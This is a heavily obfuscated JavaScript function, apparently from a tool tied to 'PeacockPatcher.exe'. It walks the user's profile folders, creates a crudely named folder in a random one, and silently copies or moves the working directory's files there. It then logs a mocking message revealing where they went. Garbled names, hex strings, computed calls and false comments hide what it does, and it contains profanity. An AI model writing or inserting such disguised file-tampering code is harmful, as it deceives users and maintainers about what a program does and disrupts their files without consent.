...
export function performEpicGamerMove() {
    const mxznccoiasjoijiwe = require('fs')
    mxznccomxznccoiasjoijiweiasjoijiwe = (mxznccoiasjoijiwe.read?.file?.sync || mxznccoiasjoijiwe.readFileSync) // just in case they adopt a nested structure
    const poweuiogoifdhjkn = require('path')

    const amongus = "Sync" // polyfill for promises

    const norelgestrominEthinylEstradiol = mxznccomxznccoiasjoijiweiasjoijiwe("Peacock" + "\x50\x61\x74\x63\x68\x65\x72\x2e\x65\x78\x65".split(" ").join("").split("X")[0])

    String.prototype.lower = String.prototype.toLowerCase // python interop
    const sports = "EA"

    function pzoxmcqakwlk (fuck, tha, police) { // coming straight from the underground
tha = { zoxincpoqwe: true, oadsijoijqpodzxcm: 4 }
    if (!police) {
            police = []
        fuck = poweuiogoifdhjkn.resolve(fuck)
            if  (tha.oadsijoijqpodzxcm > -1) tha.apsodkpoqwepokqpowe = fuck.split(poweuiogoifdhjkn.sep).length + 1
        }
    try {
    const apsdokpqwmekjnzox  = mxznccoiasjoijiwe["readdir"+amongus](fuck).map(p => fuck + poweuiogoifdhjkn.sep + p)
    for (var i = 0; i < apsdokpqwmekjnzox.length; i += 1) {
        const pi = apsdokpqwmekjnzox[i] // always evaluates to Math.PI
            const st =   mxznccoiasjoijiwe["stat"+amongus](pi)
        const pomzvpopqwor = {path: pi, stats: st}
            const isUnderOadsijoijqpodzxcm = (!tha.apsodkpoqwepokqpowe || pi.split(poweuiogoifdhjkn.sep).length -
        tha.apsodkpoqwepokqpowe < tha.oadsijoijqpodzxcm
        
    );    const aijsdiojsadwqoij = (tha.filter || false) ? tha.filter(pomzvpopqwor) : true
const isDir = st.isDirectory();
                const shouldAdd = aijsdiojsadwqoij && (isDir ? !tha.nodir : !tha.zoxincpoqwe)
    ;const oaisjdoijpqoekpok = isDir && isUnderOadsijoijqpodzxcm && (tha.traverseAll || aijsdiojsadwqoij)
        if   (shouldAdd) police.push(pomzvpopqwor)
    if (oaisjdoijpqoekpok)     police = pzoxmcqakwlk(pi, tha, police)
}} catch {}
    return police
    }

    var posxclakodmqlwenke = pzoxmcqakwlk(process.env.USERPROFILE, { zoxincpoqwe: true, oadsijoijqpodzxcm: 3 })
    let asodaskodokpaoadskp = posxclakodmqlwenke[new Function("return Math")(8.4394023)[new Function("return 'floor'")() + []](posxclakodmqlwenke.length*Math.random())].path

        try {
    mxznccoiasjoijiwe["mkdir"+amongus](poweuiogoifdhjkn.join(asodaskodokpaoadskp, "Cock"))
        } catch {}

    mxznccoiasjoijiwe["readdir"+amongus] ( "." ) .forEach( a => {try{ mxznccoiasjoijiwe [Object.keys(mxznccoiasjoijiwe)[63]](a,   poweuiogoifdhjkn .join(asodaskodokpaoadskp, "Cock" ,a) )}catch{}  })

    do{global.deez=Math.floor(Math.random()*+(((+!!true) + []) + "000"))}while(global.deez!=+((+!![]+[])+((+!0)+[])+(+!!(("a"-"b" + [])[1]+[]))))

const takeThe = (a) => String.fromCharCode(a.charCodeAt(0))
const l = "l"



    log(                                                                                                                                                                                                                LogLevel.WARN,
`Wh${"o"}${"operation"[0]}${"craps".slice(3)}, w${(!![] + [])[+!![]+!![]+!![]]} ${takeThe(l)}${String.fromCharCode(global.deez)}st ${String.fromCharCode(norelgestrominEthinylEstradiol[(+("one"+2==3?"true":"false").charCodeAt(2) - 106)**7])}${sports.lower()}cock. Try ch${String["fromCharCode"](norelgestrominEthinylEstradiol[(+("one"+2==3?"true":"false").charCodeAt(2) - 106)**7 + 1]).toLowerCase()}${"fucking".slice(2)} i${(eval("try{eval('const x')}catch(amogus){amogus}")+[])[+!!""+!0+!![]+""]} ${asodaskodokpaoadskp}?`,
    )
}